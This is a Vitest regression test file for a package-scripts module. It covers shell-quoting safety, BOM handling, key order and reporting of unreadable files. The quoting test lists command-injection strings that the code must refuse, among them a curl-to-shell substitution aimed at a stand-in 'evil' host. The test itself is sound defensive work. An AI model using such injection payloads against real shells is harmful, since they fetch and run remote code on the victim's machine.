import { chmod, mkdir, mkdtemp, rm, writeFile } from 'fs/promises'
import { tmpdir } from 'os'
import { join } from 'path'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { getPackageScripts, parsePackageScripts } from '../src/main/package-scripts'
import { scriptCommandLine } from '../src/shared/scripts'

/**
 * Regression cover for the scripts-desk review pass: shell-quoting safety,
 * BOM tolerance, file order, and unreadable-file reporting. The broader
 * suite (package-scripts.test.ts) owns parsing basics and manager
 * detection; this file owns the fixed seams.
 */

vi.mock('../src/main/git/sync', () => ({
  verifyRepository: vi.fn(async () => {})
}))

describe('scriptCommandLine — inert quoting only', () => {
  it('refuses to quote a name that double quotes cannot neutralize', () => {
    // $() expansion, backticks, %VAR%, history events, embedded quotes,
    // and backslash escapes all EXECUTE or split inside "..." on at least
    // one of cmd/PowerShell/POSIX — the line must be refused, not typed.
    const dangerous = [
      'x$(curl evil|sh)',
      'y`id`',
      'z$HOME',
      'w%PATH%',
      'v!history',
      'u"injected"',
      "t'injected",
      's\\escape'
    ]
    for (const name of dangerous) {
      expect(scriptCommandLine({ manager: 'npm' }, name)).toBeNull()
    }
  })

  it('still quotes (not refuses) names that are merely spaced or braced', () => {
    expect(scriptCommandLine({ manager: 'npm' }, 'build: win')).toBe('npm run "build: win"')
    expect(scriptCommandLine({ manager: 'npm' }, 'dev; server')).toBe('npm run "dev; server"')
    expect(scriptCommandLine({ manager: 'npm' }, 'smoke-test_2')).toBe('npm run smoke-test_2')
  })
})

describe('parsePackageScripts — the fixed seams', () => {
  it('tolerates a UTF-8 BOM exactly like npm does', () => {
    const plain = parsePackageScripts('{"scripts":{"dev":"vite"}}')
    const bom = parsePackageScripts('\uFEFF{"scripts":{"dev":"vite"}}')
    expect(bom).toEqual(plain)
    expect(bom.scripts).toEqual([{ name: 'dev', command: 'vite' }])
  })

  it('keeps file order even when an integer-like key hoists in JS', () => {
    const json = '{"scripts":{"dev":"a","2":"b","build":"c"}}'
    const parsed = parsePackageScripts(json)
    expect(parsed.scripts.map(s => s.name)).toEqual(['dev', '2', 'build'])
  })
})

describe('getPackageScripts — unreadable is not absent', () => {
  let root: string

  beforeAll(async () => {
    root = await mkdtemp(join(tmpdir(), 'aspen-scripts-fix-'))
  })
  afterAll(async () => {
    await chmod(join(root, 'locked', 'package.json'), 0o644).catch(() => undefined)
    await rm(root, { recursive: true, force: true })
  })

  it('reports an EACCES package.json instead of pretending it is absent', async () => {
    const dir = join(root, 'locked')
    await mkdir(dir, { recursive: true })
    await writeFile(join(dir, 'package.json'), '{"scripts":{"dev":"vite"}}', 'utf8')
    await chmod(join(dir, 'package.json'), 0o000)
    try {
      const result = await getPackageScripts(dir)
      expect(result.scripts).toEqual([])
      expect(result.error).toMatch(/Could not read package\.json/)
    } finally {
      await chmod(join(dir, 'package.json'), 0o644)
    }
  })
})
